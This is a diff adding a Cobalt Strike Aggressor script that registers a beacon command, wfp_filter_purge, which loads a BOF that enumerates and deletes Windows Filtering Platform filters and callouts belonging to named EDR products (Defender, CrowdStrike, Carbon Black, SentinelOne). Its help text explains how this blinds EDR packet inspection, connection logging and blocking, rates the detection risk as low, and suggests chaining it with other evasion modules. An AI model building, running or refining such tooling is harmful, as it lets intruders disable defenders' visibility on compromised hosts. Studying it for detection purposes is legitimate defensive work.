@@ -1,0 +1,108 @@
+# wfp_filter_purge.cna — Aggressor script for wfp_filter_purge BOF
+#
+# Delete EDR WFP (Windows Filtering Platform) filters and callouts
+# via the documented user-mode management API — fwpuclnt.dll.
+#
+# The surprise: WFP is NOT kernel-only.
+#   The FWPM management layer (fwpuclnt.dll) is a standard user-mode API
+#   accessible with local Admin rights. It talks to the BFE (Base Filtering
+#   Engine) service over local RPC. No kernel driver needed.
+#
+#   EDR products register WFP callouts + filters to inspect network traffic:
+#   deep packet inspection, connection logging, TLS SNI capture, blocking.
+#   Deleting their filters via FwpmFilterDeleteById0 neutralizes all of this.
+#
+# Usage:
+#   wfp_filter_purge list              enumerate all WFP filters and callouts
+#   wfp_filter_purge purge defender    delete filters matching "defender"
+#   wfp_filter_purge purge crowdstrike delete CrowdStrike WFP entries
+#   wfp_filter_purge purge sense       delete MDE Sense WFP entries
+#   wfp_filter_purge purge carbon      delete Carbon Black WFP entries
+
+alias wfp_filter_purge {
+    local('$bof $args $bid $handle $path $mode $keyword');
+    $bid  = $1;
+    $path = script_resource("wfp_filter_purge.x64.o");
+
+    $handle = openf($path);
+    if ($handle is $null) {
+        berror($bid, "[wfp_filter_purge] Cannot open BOF: " . $path);
+        return;
+    }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) {
+        berror($bid, "[wfp_filter_purge] readb failed: " . $path);
+        return;
+    }
+    println("[wfp_filter_purge] loaded " . strlen($bof) . " bytes from " . $path);
+
+    if (size(@_) == 1) {
+        berror($bid, "[wfp_filter_purge] Usage:\n" .
+            "  wfp_filter_purge list              list all WFP filters and callouts\n" .
+            "  wfp_filter_purge purge <keyword>   delete matching filters+callouts\n\n" .
+            "Common keywords:\n" .
+            "  defender    Microsoft Defender / MDE\n" .
+            "  sense       MDE Sense service filters\n" .
+            "  crowdstrike CrowdStrike Falcon\n" .
+            "  carbon      Carbon Black\n" .
+            "  sentinel    SentinelOne");
+        return;
+    }
+
+    if ($2 eq "purge") {
+        if (size(@_) < 3) {
+            berror($bid, "[wfp_filter_purge] purge requires a keyword argument.");
+            return;
+        }
+        $mode    = 1;
+        $keyword = $3;
+        btask($bid, "WFP Filter Purge: deleting filters/callouts matching '" . $keyword . "'");
+    } else {
+        $mode    = 0;
+        $keyword = "";
+        btask($bid, "WFP Filter Purge: listing all WFP filters and callouts");
+    }
+
+    # i = int32 (mode), z = narrow string (keyword, empty for list mode)
+    $args = bof_pack("iz", $mode, $keyword);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "wfp_filter_purge",
+    "Delete EDR WFP network inspection filters via user-mode fwpuclnt.dll API",
+    "Usage:\n" .
+    "  wfp_filter_purge list              enumerate all WFP filters and callouts\n" .
+    "  wfp_filter_purge purge <keyword>   delete filters/callouts matching keyword\n\n" .
+    "Examples:\n" .
+    "  wfp_filter_purge list\n" .
+    "  wfp_filter_purge purge defender\n" .
+    "  wfp_filter_purge purge sense\n" .
+    "  wfp_filter_purge purge crowdstrike\n\n" .
+    "The misconception this exploits:\n" .
+    "  Most people think manipulating WFP requires a kernel driver.\n" .
+    "  WRONG. The FWPM management layer (fwpuclnt.dll) is a fully documented\n" .
+    "  user-mode API. This is how netsh, Windows Firewall MMC, and\n" .
+    "  Get-NetFirewallRule all work. No driver, no exploit needed.\n\n" .
+    "How EDRs use WFP:\n" .
+    "  1. EDR kernel driver calls FwpsCalloutRegister (kernel) for DPI callout\n" .
+    "  2. EDR driver calls FwpmCalloutAdd0 (management layer) to register entry\n" .
+    "  3. EDR driver calls FwpmFilterAdd0 to add a RULE: 'for TCP connects,\n" .
+    "     invoke callout X'\n" .
+    "  The FILTER is the rule that triggers the callout. Without the filter,\n" .
+    "  the callout function is never called regardless of kernel state.\n\n" .
+    "What gets destroyed:\n" .
+    "  - EDR deep packet inspection (TLS SNI, payload inspection)\n" .
+    "  - EDR connection logging (which process connected to what)\n" .
+    "  - EDR network blocking capability via WFP\n" .
+    "  Windows Firewall rules (from Windows itself) are UNAFFECTED —\n" .
+    "  they have different provider namespaces and we match by EDR keyword.\n\n" .
+    "Detection profile:\n" .
+    "  LOW. FwpmFilterDeleteById0 is identical to 'netsh advfirewall' or\n" .
+    "  'Remove-NetFirewallRule' — normal network admin activity.\n" .
+    "  BFE audit log records deletions but EDR would need to watch BFE\n" .
+    "  specifically (almost none do in production deployments).\n\n" .
+    "Requires: Local Administrator\n" .
+    "Combine with: nrpt_sinkhole, null_route, etwpatch, ldr_notify_purge"
+);
